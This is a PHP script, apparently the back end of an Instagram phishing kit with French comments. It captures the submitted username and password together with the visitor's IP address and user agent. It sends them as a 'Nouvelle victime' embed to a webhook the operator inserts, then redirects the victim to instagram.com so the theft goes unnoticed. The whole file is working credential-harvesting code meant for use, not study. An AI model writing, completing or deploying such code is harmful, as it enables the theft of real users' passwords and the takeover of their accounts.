<?php
// DISPLAY ERRORS
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$message = "
📧Email : ".$_POST['username']."
📧Mot De Passe : ".$_POST['password']."
📧 User Agent: ".$_SERVER["HTTP_USER_AGENT"]."
📧 IP: ".$_SERVER['REMOTE_ADDR']."
";


$_SESSION['step_one']  = true;


$webhookurl = "";//INSERER LE LIEN DU webhook
$timestamp = date("c", strtotime("now"));
$json_data = json_encode([

    "username" => "Nouvelle victime",
    "tts" => false,
    "embeds" =>
	[
        [
            "title" => "L'utilisateur ".$_POST['username']." à mordu",
            "type" => "rich",
            "description" => $message,
            "timestamp" => $timestamp,
            "color" => hexdec( "3366ff" ),

        ]
    ]


], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
curl_close( $ch );





header("Location: https://instagram.com");

?>
